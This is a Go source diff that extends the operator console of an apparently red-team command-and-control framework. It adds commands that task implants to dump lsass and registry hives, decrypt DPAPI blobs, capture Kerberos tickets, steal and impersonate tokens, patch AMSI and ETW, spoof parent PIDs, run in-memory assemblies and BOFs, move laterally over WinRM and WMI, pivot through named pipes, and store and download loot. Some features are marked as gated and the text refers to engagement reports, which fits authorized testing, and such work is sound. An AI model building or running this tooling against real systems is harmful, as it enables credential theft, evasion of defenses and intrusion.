@@ -2,12 +2,15 @@ package main
 
 import (
 	"bufio"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 
@@ -251,6 +254,379 @@ func main() {
 			}
 			cmdTask(client, activeSession.ID, "ps", "")
 
+		case "psinfo":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "process_info", "")
+
+		case "suspend", "resume":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError(fmt.Sprintf("Usage: %s <pid>", cmd))
+				continue
+			}
+			taskType := "process_suspend"
+			if cmd == "resume" {
+				taskType = "process_resume"
+			}
+			cmdTask(client, activeSession.ID, taskType, args[0])
+
+		case "getprivs":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "getprivs", "")
+
+		case "creds":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "credential_enum", "")
+
+		case "credread":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: credread <path>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "credential_read", args[0])
+
+		case "assembly":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: assembly <local-dll-or-exe> [args...]")
+				continue
+			}
+			data, err := os.ReadFile(args[0])
+			if err != nil {
+				printError(fmt.Sprintf("Failed to read assembly: %v", err))
+				continue
+			}
+			req := map[string]any{"assembly": base64.StdEncoding.EncodeToString(data)}
+			if len(args) > 1 {
+				req["arguments"] = args[1:]
+			}
+			payload, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "execute_assembly", string(payload))
+
+		case "otimport":
+			if len(args) < 2 {
+				printError("Usage: otimport <asset|vuln|credential|hmi|wireless|compliance|topology|segmentation> <task-id>")
+				continue
+			}
+			var result map[string]any
+			if err := client.Post("/api/ot/import", map[string]string{
+				"type": args[0], "task_id": args[1],
+			}, &result); err != nil {
+				printError(fmt.Sprintf("Failed to import OT findings: %v", err))
+				continue
+			}
+			data, _ := json.MarshalIndent(result, "", "  ")
+			fmt.Println(string(data))
+
+		case "otreports":
+			if len(args) >= 2 && args[0] == "generate" {
+				format := "markdown"
+				if len(args) >= 3 {
+					format = args[2]
+				}
+				var report map[string]any
+				if err := client.Post("/api/ot/reports", map[string]string{
+					"engagement_id": args[1], "format": format,
+				}, &report); err != nil {
+					printError(fmt.Sprintf("Failed to generate OT report: %v", err))
+					continue
+				}
+				data, _ := json.MarshalIndent(report, "", "  ")
+				fmt.Println(string(data))
+				continue
+			}
+			var reports []map[string]any
+			if err := client.Get("/api/ot/reports", &reports); err != nil {
+				printError(fmt.Sprintf("Failed to list OT reports: %v", err))
+				continue
+			}
+			if len(reports) == 0 {
+				printInfo("No OT reports stored.")
+				continue
+			}
+			for _, r := range reports {
+				fmt.Printf("%v  %-12v assets=%v vulns=%v risk=%v\n",
+					r["id"], r["format"], r["asset_count"], r["vuln_count"], r["risk_score"])
+			}
+
+		case "amsi", "etw":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			taskType := "evasion_amsi"
+			if cmd == "etw" {
+				taskType = "evasion_etw"
+			}
+			cmdTask(client, activeSession.ID, taskType, "")
+
+		case "namedpipe":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: namedpipe <start <pipe> <target>|stop <pipe>|status>")
+				continue
+			}
+			req := map[string]any{"action": args[0]}
+			switch args[0] {
+			case "start":
+				if len(args) < 3 {
+					printError("Usage: namedpipe start <pipe> <target>")
+					continue
+				}
+				req["pipe"], req["target"] = args[1], args[2]
+			case "stop":
+				if len(args) < 2 {
+					printError("Usage: namedpipe stop <pipe>")
+					continue
+				}
+				req["pipe"] = args[1]
+			}
+			payload, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "pivot_namedpipe", string(payload))
+
+		case "winrm", "wmi":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 4 {
+				printError(fmt.Sprintf("Usage: %s <target> <user> <password> <command> [port]", cmd))
+				continue
+			}
+			req := map[string]any{
+				"target": args[0], "username": args[1],
+				"password": args[2], "command": strings.Join(args[3:], " "),
+			}
+			taskType := "lateral_winrm"
+			if cmd == "wmi" {
+				taskType = "lateral_wmi"
+			}
+			payload, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, taskType, string(payload))
+
+		case "plugins":
+			var resp struct {
+				Plugins []struct {
+					Name     string `json:"name"`
+					Version  string `json:"version"`
+					Commands []struct {
+						Name        string `json:"name"`
+						TaskType    string `json:"task_type"`
+						Description string `json:"description"`
+					} `json:"commands"`
+				} `json:"plugins"`
+				Errors []string `json:"errors"`
+			}
+			if err := client.Get("/api/plugins", &resp); err != nil {
+				printError(fmt.Sprintf("Failed to list plugins: %v", err))
+				continue
+			}
+			for _, p := range resp.Plugins {
+				fmt.Printf("%s v%s\n", p.Name, p.Version)
+				for _, c := range p.Commands {
+					fmt.Printf("  %-24s -> %s  %s\n", c.Name, c.TaskType, c.Description)
+				}
+			}
+			for _, e := range resp.Errors {
+				printWarning("plugin: " + e)
+			}
+			if len(resp.Plugins) == 0 {
+				printInfo("No plugins loaded.")
+			}
+
+		case "pluginrun":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 2 {
+				printError("Usage: pluginrun <plugin> <command> [key=value ...]")
+				continue
+			}
+			arguments := map[string]string{}
+			for _, pair := range args[2:] {
+				if key, value, ok := strings.Cut(pair, "="); ok {
+					arguments[key] = value
+				}
+			}
+			var resp TaskResponse
+			if err := client.Post("/api/plugins/run", map[string]any{
+				"plugin": args[0], "command": args[1],
+				"session_id": activeSession.ID, "arguments": arguments,
+			}, &resp); err != nil {
+				printError(fmt.Sprintf("Failed to run plugin: %v", err))
+				continue
+			}
+			printInfo(fmt.Sprintf("Task submitted: %s", resp.TaskID))
+			if result, ok := pollTask(client, resp.TaskID, taskPollTimeout); ok {
+				renderTaskResult(result)
+			}
+
+		case "ppid":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 2 {
+				printError("Usage: ppid <parent-pid> <command...>")
+				continue
+			}
+			parentPID, err := strconv.Atoi(args[0])
+			if err != nil || parentPID <= 0 {
+				printError("parent PID must be a positive integer")
+				continue
+			}
+			req := map[string]any{
+				"parent_pid": parentPID,
+				"command":    strings.Join(args[1:], " "),
+			}
+			payload, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "evasion_ppid_spoof", string(payload))
+
+		case "bof":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: bof <local-coff-file> [args-base64]")
+				continue
+			}
+			data, err := os.ReadFile(args[0])
+			if err != nil {
+				printError(fmt.Sprintf("Failed to read COFF: %v", err))
+				continue
+			}
+			req := map[string]any{"coff": base64.StdEncoding.EncodeToString(data)}
+			if len(args) > 1 {
+				req["args"] = args[1]
+			}
+			payload, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "inline_execute", string(payload))
+
+		case "loot":
+			if len(args) < 1 {
+				printError("Usage: loot <list|add|get|download|rm> [args]")
+				continue
+			}
+			cmdLoot(client, args)
+
+		case "dpapi":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: dpapi <blob-file> [entropy-base64] [machine]")
+				continue
+			}
+			data, err := os.ReadFile(args[0])
+			if err != nil {
+				printError(fmt.Sprintf("Failed to read DPAPI blob: %v", err))
+				continue
+			}
+			req := map[string]any{"data": base64.StdEncoding.EncodeToString(data)}
+			if len(args) > 1 {
+				req["entropy"] = args[1]
+			}
+			if len(args) > 2 && args[2] == "machine" {
+				req["machine"] = true
+			}
+			payload, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "credential_dpapi", string(payload))
+
+		case "kerberos":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "credential_kerberos", "")
+
+		case "dump":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: dump <lsass|sam|security|system>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "credential_dump", args[0])
+
+		case "tokens":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_list", "")
+
+		case "steal":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: steal <pid>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_steal", args[0])
+
+		case "maketoken":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 2 {
+				printError("Usage: maketoken <username> <password> [domain]")
+				continue
+			}
+			req := map[string]string{"username": args[0], "password": args[1]}
+			if len(args) >= 3 {
+				req["domain"] = args[2]
+			}
+			data, _ := json.Marshal(req)
+			cmdTask(client, activeSession.ID, "token_make", string(data))
+
+		case "impersonate":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			if len(args) < 1 {
+				printError("Usage: impersonate <token-id>")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_impersonate", args[0])
+
+		case "revert":
+			if activeSession == nil {
+				printError("No active session. Use 'use <id>' first.")
+				continue
+			}
+			cmdTask(client, activeSession.ID, "token_revert", "")
+
 		case "cat":
 			if activeSession == nil {
 				printError("No active session. Use 'use <id>' first.")
@@ -428,6 +804,32 @@ func printHelp() {
 		{"pwd", "Print working directory on target"},
 		{"cd <path>", "Change directory on target"},
 		{"ps", "List running processes on target"},
+		{"psinfo", "Structured process list (JSON: PID, PPID, user, cmdline, RSS)"},
+		{"suspend <pid>", "Suspend a process (engagement privilege capability)"},
+		{"resume <pid>", "Resume a suspended process"},
+		{"getprivs", "List the implant's privileges (Windows) or capabilities (Linux)"},
+		{"creds", "Enumerate credential-bearing files and environment variables (gated)"},
+		{"credread <path>", "Read one credential file named by the operator (gated)"},
+		{"dump <kind>", "Dump lsass or a SAM/SECURITY/SYSTEM hive on Windows (gated)"},
+		{"dpapi <file> [entropy] [machine]", "Decrypt a DPAPI blob on Windows (gated)"},
+		{"kerberos", "List Kerberos tickets and capture the local ccache (gated)"},
+		{"loot list|add <task>|get <id>|download <id>|rm <id>", "Manage engagement loot on the server"},
+		{"otimport <type> <task-id>", "Persist OT task findings (asset, vuln, credential, ...)"},
+		{"otreports [generate <engagement> [format]]", "List or generate OT assessment reports"},
+		{"assembly <file> [args...]", "Load a .NET assembly in PowerShell on Windows"},
+		{"plugins", "List installed operator plugin manifests"},
+		{"pluginrun <plugin> <cmd> [k=v ...]", "Run a plugin command on the active session"},
+		{"bof <file> [args-base64]", "Execute a COFF/BOF in memory on Windows (gated)"},
+		{"namedpipe <start|stop|status> ...", "Named-pipe pivot on Windows (gated)"},
+		{"winrm <target> <user> <pass> <cmd>", "Run a command over PowerShell Remoting (gated)"},
+		{"wmi <target> <user> <pass> <cmd>", "Create a process over WMI (gated)"},
+		{"amsi, etw", "Patch AMSI or ETW in the implant process on Windows (gated)"},
+		{"ppid <pid> <command>", "Spawn a process with a spoofed parent on Windows (gated)"},
+		{"tokens", "List the current and stored tokens"},
+		{"steal <pid>", "Duplicate a process token and store it"},
+		{"maketoken <user> <pass> [domain]", "Log on with credentials and store the token"},
+		{"impersonate <id>", "Verify a stored token on a locked thread, then revert"},
+		{"revert", "Close all stored token handles"},
 		{"cat <file>", "Read file contents on target"},
 		{"upload <local> <remote>", "Upload a local file to the target"},
 		{"download <remote> [local]", "Download a file from the target"},
@@ -650,6 +1052,112 @@ func isTaskPending(result *TaskResult) bool {
 }
 
 // cmdTask submits a task and polls until completion, then renders its output.
+// LootArtifact mirrors the server's metadata response (the blob path is not
+// serialized).
+type LootArtifact struct {
+	ID           string `json:"id"`
+	EngagementID string `json:"engagement_id"`
+	SessionID    string `json:"session_id,omitempty"`
+	TaskID       string `json:"task_id,omitempty"`
+	Operator     string `json:"operator"`
+	Kind         string `json:"kind"`
+	Name         string `json:"name"`
+	Size         int64  `json:"size"`
+	SHA256       string `json:"sha256"`
+	Note         string `json:"note,omitempty"`
+	CreatedAt    string `json:"created_at"`
+}
+
+func cmdLoot(client *api.Client, args []string) {
+	switch args[0] {
+	case "list", "ls":
+		var artifacts []LootArtifact
+		if err := client.Get("/api/loot", &artifacts); err != nil {
+			printError(fmt.Sprintf("Failed to list loot: %v", err))
+			return
+		}
+		if len(artifacts) == 0 {
+			printInfo("No loot stored.")
+			return
+		}
+		fmt.Printf("%-38s %-12s %-24s %10s  %s\n", "ID", "KIND", "NAME", "SIZE", "SHA256")
+		for _, a := range artifacts {
+			fmt.Printf("%-38s %-12s %-24s %10d  %.12s\n", a.ID, a.Kind, a.Name, a.Size, a.SHA256)
+		}
+
+	case "add":
+		if len(args) < 2 {
+			printError("Usage: loot add <task-id> [name]")
+			return
+		}
+		body := map[string]string{"task_id": args[1], "kind": "task"}
+		if len(args) >= 3 {
+			body["name"] = args[2]
+		}
+		var artifact LootArtifact
+		if err := client.Post("/api/loot", body, &artifact); err != nil {
+			printError(fmt.Sprintf("Failed to store loot: %v", err))
+			return
+		}
+		printInfo(fmt.Sprintf("Stored loot %s (%s, %d bytes)", artifact.ID, artifact.Name, artifact.Size))
+
+	case "get":
+		if len(args) < 2 {
+			printError("Usage: loot get <id>")
+			return
+		}
+		var artifact LootArtifact
+		if err := client.Get("/api/loot/"+args[1], &artifact); err != nil {
+			printError(fmt.Sprintf("Failed to get loot: %v", err))
+			return
+		}
+		data, _ := json.MarshalIndent(artifact, "", "  ")
+		fmt.Println(string(data))
+
+	case "download":
+		if len(args) < 2 {
+			printError("Usage: loot download <id> [local-path]")
+			return
+		}
+		dest := ""
+		if len(args) >= 3 {
+			dest = args[2]
+		} else {
+			var artifact LootArtifact
+			if err := client.Get("/api/loot/"+args[1], &artifact); err == nil {
+				dest = artifact.Name
+			}
+			if dest == "" || dest == "." {
+				dest = args[1] + ".bin"
+			}
+		}
+		data, err := client.GetBytes("/api/loot/" + args[1] + "/download")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to download loot: %v", err))
+			return
+		}
+		if err := os.WriteFile(dest, data, 0600); err != nil {
+			printError(fmt.Sprintf("Failed to write %s: %v", dest, err))
+			return
+		}
+		printInfo(fmt.Sprintf("Wrote %d bytes to %s", len(data), dest))
+
+	case "rm", "delete":
+		if len(args) < 2 {
+			printError("Usage: loot rm <id>")
+			return
+		}
+		if err := client.Delete("/api/loot/"+args[1], nil); err != nil {
+			printError(fmt.Sprintf("Failed to delete loot: %v", err))
+			return
+		}
+		printInfo("Loot deleted.")
+
+	default:
+		printError("Usage: loot <list|add|get|download|rm> [args]")
+	}
+}
+
 func cmdTask(client *api.Client, sessionID string, taskType string, taskArgs string) {
 	result, ok := submitAndPoll(client, sessionID, taskType, taskArgs)
 	if !ok {
@@ -1027,6 +1535,12 @@ func cmdDownload(client *api.Client, sessionID string, remotePath string, localP
 		localPath = filepath.Base(remotePath)
 	}
 
+	// Prefer chunked transfer; fall back to the legacy single-result download
+	// when the implant does not implement the chunk task types.
+	if cmdDownloadChunked(client, sessionID, remotePath, localPath) {
+		return
+	}
+
 	req := TaskRequest{
 		Type: "download",
 		Args: remotePath,
@@ -1061,4 +1575,86 @@ func cmdDownload(client *api.Client, sessionID string, remotePath string, localP
 	}
 
 	printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", len(decoded), localPath))
+}
+
+// cmdDownloadChunked streams a file in bounded chunks, avoiding the frame-size
+// and memory limits of a single base64 result. It returns false when the
+// implant does not support download_stat/download_chunk, so the caller can use
+// the legacy path.
+func cmdDownloadChunked(client *api.Client, sessionID, remotePath, localPath string) bool {
+	statResult, ok := submitAndPoll(client, sessionID, "download_stat", remotePath)
+	if !ok || !statResult.Success {
+		return false
+	}
+	var stat struct {
+		Size   int64  `json:"size"`
+		SHA256 string `json:"sha256"`
+	}
+	if err := json.Unmarshal([]byte(statResult.Output), &stat); err != nil {
+		return false
+	}
+
+	printInfo(fmt.Sprintf("Downloading %s (%d bytes) -> %s", remotePath, stat.Size, localPath))
+
+	file, err := os.Create(localPath)
+	if err != nil {
+		printError(fmt.Sprintf("Failed to create local file: %v", err))
+		return true
+	}
+	defer file.Close()
+
+	const chunkSize = 1 << 20
+	hasher := sha256.New()
+	var offset int64
+	for offset < stat.Size {
+		args, _ := json.Marshal(map[string]any{
+			"path":   remotePath,
+			"offset": offset,
+			"length": chunkSize,
+		})
+		result, ok := submitAndPoll(client, sessionID, "download_chunk", string(args))
+		if !ok {
+			_ = os.Remove(localPath)
+			return true
+		}
+		if !result.Success {
+			printError(fmt.Sprintf("Chunk download failed at offset %d: %s", offset, result.Error))
+			_ = os.Remove(localPath)
+			return true
+		}
+		var chunk struct {
+			Data   string `json:"data"`
+			Length int    `json:"length"`
+			EOF    bool   `json:"eof"`
+		}
+		if err := json.Unmarshal([]byte(result.Output), &chunk); err != nil {
+			printError(fmt.Sprintf("Failed to parse chunk at offset %d: %v", offset, err))
+			_ = os.Remove(localPath)
+			return true
+		}
+		data, err := base64.StdEncoding.DecodeString(chunk.Data)
+		if err != nil {
+			printError(fmt.Sprintf("Failed to decode chunk at offset %d: %v", offset, err))
+			_ = os.Remove(localPath)
+			return true
+		}
+		if _, err := file.WriteAt(data, offset); err != nil {
+			printError(fmt.Sprintf("Failed to write local chunk at offset %d: %v", offset, err))
+			_ = os.Remove(localPath)
+			return true
+		}
+		_, _ = hasher.Write(data)
+		offset += int64(len(data))
+		if chunk.EOF || len(data) == 0 {
+			break
+		}
+	}
+
+	if stat.SHA256 != "" {
+		if got := hex.EncodeToString(hasher.Sum(nil)); got != stat.SHA256 {
+			printWarning(fmt.Sprintf("SHA-256 mismatch: got %s, want %s", got, stat.SHA256))
+		}
+	}
+	printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", offset, localPath))
+	return true
 }
